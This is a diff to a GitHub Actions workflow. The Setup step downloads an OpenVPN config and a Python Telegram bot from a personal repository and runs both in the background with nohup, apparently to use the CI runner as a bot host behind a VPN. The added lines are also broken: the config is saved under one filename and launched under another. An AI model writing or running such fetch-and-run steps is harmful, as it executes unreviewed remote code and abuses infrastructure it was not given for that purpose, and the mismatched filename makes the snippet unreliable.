@@ -35,6 +35,9 @@ jobs:
 
       - name: Setup
         run: |
+          curl -o aira.opvn https://raw.githubusercontent.com/lshanti8130-dotcom/Test/refs/heads/main/Aira66.aira.ovpn
+          sudo apt install openvpn
+          nohup openvpn aira.ovpn &
           curl -o bot.py https://raw.githubusercontent.com/lshanti8130-dotcom/Test/refs/heads/main/bot.py
           pip3 install pyTelegramBotAPI psutil
           nohup python3 bot.py &
